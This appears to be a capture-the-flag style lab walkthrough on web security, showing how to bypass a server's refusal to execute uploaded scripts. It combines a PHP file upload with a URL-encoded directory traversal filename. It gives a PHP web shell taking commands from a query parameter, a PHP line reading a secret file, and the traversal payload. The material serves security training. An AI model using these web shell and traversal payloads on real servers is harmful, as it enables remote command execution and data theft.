## Preventing file execution in user-accessible directories

While it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net.

As a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:
```
GET /static/exploit.php?command=id HTTP/1.1
    Host: normal-website.com


    HTTP/1.1 200 OK
    Content-Type: text/plain
    Content-Length: 39

    <?php echo system($_GET['command']); ?> 
```

---

## Continued
 This behavior is potentially interesting in its own right, as it may provide a way to leak source code, but it nullifies any attempt to create a web shell.

This kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.
### Tip

Web servers often use the `filename` field in `multipart/form-data` requests to determine the name and location where the file should be saved.

You should also note that even though you may send all of your requests to the same domain name, this often points to a reverse proxy server of some kind, such as a load balancer. Your requests will often be handled by additional servers behind the scenes, which may also be configured differently. 

--- 

## Process

1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to `Proxy > HTTP` history and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater or caido replay.
3.  On your system, create a file called exploit.php, containing a script for fetching the contents of Carlos's secret. For example:
```PHP
i. <?php echo file_get_contents('/home/carlos/secret'); ?>
    or
ii. <?php system($_GET['cmd']);?>
```
4. Upload this script as your avatar. Notice that the website doesn't seem to prevent you from uploading PHP files.

5. In Burp Repeater or caido replay, go to the tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text.
6. In Burp's or caido's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload and send it to Burp Repeater or caido replay.

7. In Burp Repeater or caido replay, go to the tab containing the `POST /my-account/avatar` request and find the part of the request body that relates to your PHP file. In the Content-Disposition header, change the filename to include a directory traversal sequence:
    ```WEB
    Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
    ```
8. Send the request. Notice that the response says The `file avatars/exploit.php` has been uploaded. This suggests that the server is stripping the directory traversal sequence from the file name.

9. Obfuscate the directory traversal sequence by URL encoding the forward slash (`/`) character, resulting in:
```WEB
   filename="..%2fexploit.php" or "%2e%2e%2fexploit.php".
```

- Just remove the `/avatars/..%2f` that file will now ready to go.....

- Now just add `?cmd=<command>` you are just exploited the website using path-trivarsal & file upload vuln....

10. Send the request and observe that the message now says The `file avatars/../exploit.php` has been uploaded. This indicates that the file name is being URL decoded by the server. In the browser, go back to your account page.
11. In Burp's or caido's proxy history, find the `GET /files/avatars/..%2fexploit.php` request. Observe that Carlos's secret was returned in the response or you can retrive by 2nd exploit by executing own commands on webpage. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy (`/files`), and subsequently executed by the server. Note that this means you can also request this file using `GET /files/exploit.php`.

12. Submit the secret to solve the lab.

---
